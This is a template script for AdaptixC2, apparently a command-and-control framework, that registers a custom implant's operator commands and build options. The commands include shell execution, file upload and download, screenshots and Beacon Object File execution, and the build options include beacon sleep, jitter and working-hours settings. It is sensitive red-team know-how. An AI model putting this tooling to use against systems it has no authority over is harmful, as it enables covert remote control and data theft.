/// ax_config.axs — __NAME_CAP__ Agent UI and command definitions
/// AdaptixC2 custom agent registration script.

function RegisterCommands(listenerType) {

    // ── exit ──────────────────────────────────────────────────────────────────
    var cmd_exit = create_command("exit", "Terminate the implant.", "", [], false);

    // ── file system ───────────────────────────────────────────────────────────
    var arg_ls_path = create_argument("path", "Directory path to list", true, ".", TYPE_TEXT);
    var cmd_ls = create_command("ls", "List directory contents.", "ls [path]", [arg_ls_path], false);

    var arg_upload_local  = create_argument("local",  "Local file to upload",  false, "", TYPE_FILE);
    var arg_upload_remote = create_argument("remote", "Remote path to write",  false, "", TYPE_TEXT);
    var cmd_upload = create_command("upload", "Upload a file to the agent.", "upload <local> <remote>", [arg_upload_local, arg_upload_remote], false);

    var arg_dl_path = create_argument("path", "Remote file to download", false, "", TYPE_TEXT);
    var cmd_download = create_command("download", "Download a file from the agent.", "download <path>", [arg_dl_path], false);

    var arg_rm_path = create_argument("path", "Path to remove", false, "", TYPE_TEXT);
    var cmd_rm = create_command("rm", "Remove a file or empty directory.", "rm <path>", [arg_rm_path], false);

    var arg_mkdir_path = create_argument("path", "Directory path to create", false, "", TYPE_TEXT);
    var cmd_mkdir = create_command("mkdir", "Create directories recursively.", "mkdir <path>", [arg_mkdir_path], false);

    var arg_cp_src = create_argument("src", "Source path", false, "", TYPE_TEXT);
    var arg_cp_dst = create_argument("dst", "Destination path", false, "", TYPE_TEXT);
    var cmd_cp = create_command("cp", "Copy a file or directory.", "cp <src> <dst>", [arg_cp_src, arg_cp_dst], false);

    var arg_mv_src = create_argument("src", "Source path", false, "", TYPE_TEXT);
    var arg_mv_dst = create_argument("dst", "Destination path", false, "", TYPE_TEXT);
    var cmd_mv = create_command("mv", "Move/rename a file or directory.", "mv <src> <dst>", [arg_mv_src, arg_mv_dst], false);

    var arg_cd_path = create_argument("path", "Directory to change to", true, ".", TYPE_TEXT);
    var cmd_cd = create_command("cd", "Change working directory.", "cd [path]", [arg_cd_path], false);

    var cmd_pwd = create_command("pwd", "Print current working directory.", "", [], false);

    var arg_cat_path = create_argument("path", "File to read", false, "", TYPE_TEXT);
    var cmd_cat = create_command("cat", "Print file contents.", "cat <path>", [arg_cat_path], false);

    // ── OS commands ───────────────────────────────────────────────────────────
    var arg_run_cmd = create_argument("command", "Command to run (use quotes for spaces)", false, "", TYPE_TEXT);
    var cmd_run = create_command("run", "Execute a shell command.", "run <command>", [arg_run_cmd], false);

    var cmd_info = create_command("info", "Get system information.", "", [], false);
    var cmd_ps   = create_command("ps",   "List running processes.",  "", [], false);
    var cmd_screenshot = create_command("screenshot", "Capture a screenshot.", "", [], false);

    var arg_shell_cmd = create_argument("command", "Shell command to execute", false, "", TYPE_TEXT);
    var cmd_shell = create_command("shell", "Execute a command via the OS shell.", "shell <command>", [arg_shell_cmd], false);

    var arg_kill_pid = create_argument("pid", "Process ID to kill", false, 0, TYPE_INT);
    var cmd_kill = create_command("kill", "Kill a process by PID.", "kill <pid>", [arg_kill_pid], false);

    // ── profile tuning ────────────────────────────────────────────────────────
    var arg_ps_duration = create_argument("duration", "Sleep duration (e.g. 30s, 5m, 1h)", false, "60s", TYPE_TEXT);
    var arg_ps_jitter   = create_argument("jitter",   "Jitter percentage 0-90",             true,  "20",  TYPE_INT);
    var cmd_profile_sleep = create_command(
        "profile sleep",
        "Update agent sleep interval and jitter.",
        "profile sleep <duration> [jitter%]",
        [arg_ps_duration, arg_ps_jitter],
        false
    );

    var arg_pk_date = create_argument("datetime", "Kill date (DD.MM.YYYY HH:MM:SS) or '0' to disable", false, "0", TYPE_TEXT);
    var cmd_profile_killdate = create_command(
        "profile killdate",
        "Set a kill date after which the agent terminates.",
        "profile killdate <DD.MM.YYYY HH:MM:SS | 0>",
        [arg_pk_date],
        false
    );

    var arg_pw_range = create_argument("range", "Working hours (HH:MM-HH:MM) or '0' to disable", false, "0", TYPE_TEXT);
    var cmd_profile_worktime = create_command(
        "profile worktime",
        "Restrict beacon activity to working hours.",
        "profile worktime <HH:MM-HH:MM | 0>",
        [arg_pw_range],
        false
    );

    // ── BOF execution ─────────────────────────────────────────────────────────
    var arg_bof_async = create_argument("-a", "Async mode", true, false, TYPE_BOOL);
    var arg_bof_file  = create_argument("bof", "Path to object file", false, "", TYPE_FILE);
    var arg_bof_args  = create_argument("param_data", "BOF arguments (bof_pack encoded)", true, "", TYPE_TEXT);
    var cmd_execute_bof = create_command("execute bof", "Execute Beacon Object File.", "execute bof /tmp/whoami.o", [arg_bof_async, arg_bof_file, arg_bof_args], false);

    // ── job management ────────────────────────────────────────────────────────
    var cmd_job_list = create_command("job list", "List active jobs.", "", [], false);
    var arg_jk_id = create_argument("task_id", "Task ID to kill", false, "", TYPE_TEXT);
    var cmd_job_kill = create_command("job kill", "Kill a specified job.", "job kill 1a2b3c4d", [arg_jk_id], false);

    var commands_windows = create_commands_group("__NAME__", [
        cmd_exit, cmd_ls, cmd_upload, cmd_download, cmd_rm, cmd_mkdir, cmd_cp, cmd_mv,
        cmd_cd, cmd_pwd, cmd_cat,
        cmd_run, cmd_info, cmd_ps, cmd_screenshot, cmd_shell, cmd_kill,
        cmd_profile_sleep, cmd_profile_killdate, cmd_profile_worktime,
        cmd_execute_bof, cmd_job_list, cmd_job_kill
    ]);

    var commands_linux = create_commands_group("__NAME__", [
        cmd_exit, cmd_ls, cmd_upload, cmd_download, cmd_rm, cmd_mkdir, cmd_cp, cmd_mv,
        cmd_cd, cmd_pwd, cmd_cat,
        cmd_run, cmd_info, cmd_ps, cmd_screenshot, cmd_shell, cmd_kill,
        cmd_profile_sleep, cmd_profile_killdate, cmd_profile_worktime,
        cmd_execute_bof, cmd_job_list, cmd_job_kill
    ]);

    var commands_macos = create_commands_group("__NAME__", [
        cmd_exit, cmd_ls, cmd_upload, cmd_download, cmd_rm, cmd_mkdir, cmd_cp, cmd_mv,
        cmd_cd, cmd_pwd, cmd_cat,
        cmd_run, cmd_info, cmd_ps, cmd_screenshot, cmd_shell, cmd_kill,
        cmd_profile_sleep, cmd_profile_killdate, cmd_profile_worktime,
        cmd_execute_bof, cmd_job_list, cmd_job_kill
    ]);

    return { commands_windows, commands_linux, commands_macos };
}

function GenerateUI(listeners_type) {

    var os_list   = create_combobox("os",   "Target OS",   ["linux", "windows", "darwin"]);
    var arch_list = create_combobox("arch", "Target Arch", ["amd64", "arm64"]);

    var win7_check  = create_checkbox("win7_support", "Windows 7 compat", false);

    var sleep_input  = create_line_edit("sleep",  "Sleep",  "60s");
    var jitter_spin  = create_spin_box("jitter",  "Jitter (%)", 20, 0, 90);

    var killdate_check = create_checkbox("kill_date_enabled", "Enable kill date", false);
    var killdate_input = create_datetime("kill_date", "Kill Date", "DD.MM.YYYY HH:MM:SS");

    var worktime_check = create_checkbox("work_time_enabled", "Enable working hours", false);
    var worktime_input = create_line_edit("work_time", "Working hours", "09:00-18:00");

    var timeout_spin = create_spin_box("reconn_timeout", "Reconnect timeout (s)", 5, 1, 300);
    var count_spin   = create_spin_box("reconn_count",   "Reconnect count",       5, 1, 100);

    var container = create_container([
        os_list, arch_list, win7_check,
        sleep_input, jitter_spin,
        killdate_check, killdate_input,
        worktime_check, worktime_input,
        timeout_spin, count_spin
    ]);

    return container;
}
